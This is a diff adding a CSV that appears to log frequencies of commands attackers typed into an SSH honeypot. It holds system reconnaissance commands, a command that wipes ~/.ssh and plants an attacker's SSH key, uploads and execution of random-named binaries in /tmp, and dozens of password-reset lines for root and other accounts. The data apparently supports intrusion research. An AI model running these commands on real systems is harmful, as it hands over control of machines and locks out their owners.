@@ -1,0 +1,70 @@
+,index,input
+0,uname -a,28
+1,which ls,26
+2,cat /proc/cpuinfo | grep name | wc -l,26
+3,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",26
+4,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",26
+5,ls -lh $(which ls),26
+6,crontab -l,26
+7,w,25
+8,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",25
+9,lscpu | grep Model,25
+10,uname,25
+11,top,25
+12,cat /proc/cpuinfo | grep model | grep name | wc -l,25
+13,uname -m,25
+14,Enter new UNIX password: ,10
+15,free -m,3
+16,dmidecode|grep Vendor|head -n 1,3
+17,dmesg | grep irtual,3
+18,lspci | grep irti,3
+19,cat /proc/cpuinfo,3
+20,ps -x,3
+21,./uAShKBNw,2
+22,ls,2
+23,mkdir hi,2
+24,scp -t /tmp/UoF6GVdN,2
+25,cd /tmp && chmod +x UoF6GVdN && bash -c ./UoF6GVdN,2
+26,./UoF6GVdN,2
+27,cd /tmp && chmod +x uAShKBNw && bash -c ./uAShKBNw,2
+28,scp -t /tmp/uAShKBNw,2
+29,exit,2
+30,pwd,2
+31,cd hi,2
+32,"echo ""root:Z0PHMMgumhQo""|chpasswd|bash",1
+33,"echo ""sugon\n6CocwPuJqDb9\n6CocwPuJqDb9\n""|passwd",1
+34,"echo ""12\nipuEE4P7Sybj\nipuEE4P7Sybj\n""|passwd",1
+35,/hi# pwd,1
+36,"echo ""root:tiMYUNb0yC4L""|chpasswd|bash",1
+37,"echo -e ""asterisk\nMfoXCfj0cbA3\nMfoXCfj0cbA3""|passwd|bash",1
+38,"echo ""asterisk\nMfoXCfj0cbA3\nMfoXCfj0cbA3\n""|passwd",1
+39,"echo -e ""devuser\nK0Kr2IKzk5YP\nK0Kr2IKzk5YP""|passwd|bash",1
+40,"echo ""devuser\nK0Kr2IKzk5YP\nK0Kr2IKzk5YP\n""|passwd",1
+41,"echo -e ""qwe123!@#\ncjb9ZnSNUORe\ncjb9ZnSNUORe""|passwd|bash",1
+42,"echo ""qwe123!@#\ncjb9ZnSNUORe\ncjb9ZnSNUORe\n""|passwd",1
+43,"echo -e ""squad\nADueG92hT7XP\nADueG92hT7XP""|passwd|bash",1
+44,"echo ""squad\nADueG92hT7XP\nADueG92hT7XP\n""|passwd",1
+45,"echo -e ""test123\nU7f3UMgLuphN\nU7f3UMgLuphN""|passwd|bash",1
+46,"echo ""test123\nU7f3UMgLuphN\nU7f3UMgLuphN\n""|passwd",1
+47,"echo -e ""sandbox\nPNDc9mXJnBRS\nPNDc9mXJnBRS""|passwd|bash",1
+48,"echo -e ""12\nipuEE4P7Sybj\nipuEE4P7Sybj""|passwd|bash",1
+49,"echo -e ""sugon\n6CocwPuJqDb9\n6CocwPuJqDb9""|passwd|bash",1
+50,"echo ""root:P2joRLBNFe0O""|chpasswd|bash",1
+51,"echo ""root:5LVTZq8LAg1w""|chpasswd|bash",1
+52,"echo ""root:QojDvgOkZHTv""|chpasswd|bash",1
+53,"echo ""root:wUgOc3WU5pQW""|chpasswd|bash",1
+54,"echo ""root:NDQedS9zMTL7""|chpasswd|bash",1
+55,"echo ""root:xD8U1ou4LF3m""|chpasswd|bash",1
+56,"echo ""root:xMV4dYSDBTPF""|chpasswd|bash",1
+57,"echo ""root:J2XAoP718a8k""|chpasswd|bash",1
+58,"echo -e ""123456789\n085aTs0yEinb\n085aTs0yEinb""|passwd|bash",1
+59,"echo ""123456789\n085aTs0yEinb\n085aTs0yEinb\n""|passwd",1
+60,"echo ""root:4HV6yJw1d9m0""|chpasswd|bash",1
+61,"echo ""root:ugwbAO5aNclv""|chpasswd|bash",1
+62,"echo ""root:Bh67gGcfnerg""|chpasswd|bash",1
+63,"echo ""root:CzLfzuc8bS53""|chpasswd|bash",1
+64,"echo ""root:zRFH5c79wKe5""|chpasswd|bash",1
+65,"echo ""root:n8VstsmNSMp1""|chpasswd|bash",1
+66,"echo -e ""tomcat9\nx5f3hPyTvo6V\nx5f3hPyTvo6V""|passwd|bash",1
+67,"echo ""tomcat9\nx5f3hPyTvo6V\nx5f3hPyTvo6V\n""|passwd",1
+68,"echo ""sandbox\nPNDc9mXJnBRS\nPNDc9mXJnBRS\n""|passwd",1
